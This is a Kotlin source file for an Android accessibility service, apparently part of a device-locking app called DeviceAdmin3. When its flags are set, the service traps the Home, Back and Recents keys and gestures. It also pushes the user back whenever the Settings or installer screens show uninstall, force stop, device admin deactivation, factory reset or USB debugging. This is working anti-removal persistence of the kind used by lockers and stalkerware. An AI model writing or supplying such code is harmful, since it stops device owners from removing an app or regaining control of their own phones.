package com.miniclickcrm.deviceadmin3.service

import android.accessibilityservice.AccessibilityService
import android.content.Intent
import android.util.Log
import android.view.KeyEvent
import android.view.accessibility.AccessibilityEvent
import com.miniclickcrm.deviceadmin3.manager.DeviceManager

class MyAccessibilityService : AccessibilityService() {

    private val TAG = "MyAccessibilityService"

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        val deviceManager = DeviceManager(this)
        val isLocked = deviceManager.isLocked()
        val isProtected = deviceManager.isProtected()

        if (isLocked) {
            // Block notification shade (status bar) expansion
            if (event?.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                val packageName = event.packageName?.toString() ?: ""
                if (packageName == "com.android.systemui") {
                    performGlobalAction(GLOBAL_ACTION_BACK)
                    Log.d(TAG, "Blocked system UI expansion while locked")
                }
            }
        }

        // Anti-uninstall / Anti-deactivation logic
        if (isProtected) {
            val packageName = event?.packageName?.toString() ?: ""
            // We monitor Settings and Package Installers
            val watchedPackages = listOf(
                "com.android.settings",
                "com.android.packageinstaller", 
                "com.google.android.packageinstaller"
            )

            if (watchedPackages.contains(packageName)) {
                val rootNode = rootInActiveWindow ?: return
                
                // 1. GLOBAL RESTRICTIONS (Block indiscriminately of app name)
                // Used for USB Debugging, Factory Reset, Device Admin Management
                val globalRestrictedAndKeywords = listOf(
                    "USB debugging", "Developer options", 
                    "Factory reset", "Erase all data",
                    "Device admin apps", "Device administrators",
                    "Install unknown apps"
                )

                for (keyword in globalRestrictedAndKeywords) {
                     val nodes = rootNode.findAccessibilityNodeInfosByText(keyword)
                     if (!nodes.isNullOrEmpty()) {
                         performGlobalAction(GLOBAL_ACTION_BACK)
                         Log.d(TAG, "Blocked restricted setting: $keyword")
                         return 
                     }
                }

                // 2. APP SPECIFIC RESTRICTIONS (Block only if OUR app is involved)
                // Used for App Info page actions: Uninstall, Force Stop, Storage, Permissions
                val appNames = listOf(
                    "DeviceAdmin3", 
                    "Device Admin Protection", 
                    "com.miniclickcrm.deviceadmin3"
                )
                
                var isOurAppOnScreen = false
                for (name in appNames) {
                    val nodes = rootNode.findAccessibilityNodeInfosByText(name)
                    if (!nodes.isNullOrEmpty()) {
                         isOurAppOnScreen = true
                         break
                    }
                }

                if (isOurAppOnScreen) {
                    // Keywords that define the "App Info" or "Action" interaction
                    // We allow the user to see the App Name in a simple list (e.g. "All Apps"),
                    // but we block if we see action buttons or specific headers.
                    
                    val riskyKeywords = listOf(
                        "Uninstall", "Force stop", "Open", // Buttons on App Info
                        "Storage & cache", "Permissions", // Options on App Info
                        "Deactivate", "Remove", // Device Admin
                        "App info" // Title of the screen
                    )

                    var shouldBlock = false
                    for (keyword in riskyKeywords) {
                        val nodes = rootNode.findAccessibilityNodeInfosByText(keyword)
                         if (!nodes.isNullOrEmpty()) {
                             shouldBlock = true
                             Log.d(TAG, "Blocked app-specific action: $keyword")
                             break
                         }
                    }
                    
                    if (shouldBlock) {
                         performGlobalAction(GLOBAL_ACTION_BACK)
                    }
                }
            }
        }
    }

    override fun onInterrupt() {
        // No-op
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        Log.d(TAG, "Accessibility Service Connected")
        val deviceManager = DeviceManager(this)
        if (!deviceManager.isProtected()) {
            deviceManager.setProtected(true)
        }
    }

    override fun onKeyEvent(event: KeyEvent): Boolean {
        val deviceManager = DeviceManager(this)
        
        // If the device is locked, we intercept Home and Recents
        if (deviceManager.isLocked()) {
            val keyCode = event.keyCode
            
            // Intercept Home and Recents (App Switcher)
            if (keyCode == KeyEvent.KEYCODE_HOME || 
                keyCode == KeyEvent.KEYCODE_APP_SWITCH || 
                keyCode == KeyEvent.KEYCODE_BACK) {
                
                Log.d(TAG, "Intercepted key: $keyCode while locked")
                
                // Return true to consume the event (prevents it from reaching the system)
                return true
            }
        }
        
        return super.onKeyEvent(event)
    }

    /**
     * This is called when global actions like Home or Recents are triggered via gestures
     */
    override fun onGesture(gestureId: Int): Boolean {
        val deviceManager = DeviceManager(this)
        if (deviceManager.isLocked()) {
            Log.d(TAG, "Intercepted gesture: $gestureId while locked")
            return true // Consume gesture
        }
        return super.onGesture(gestureId)
    }
}
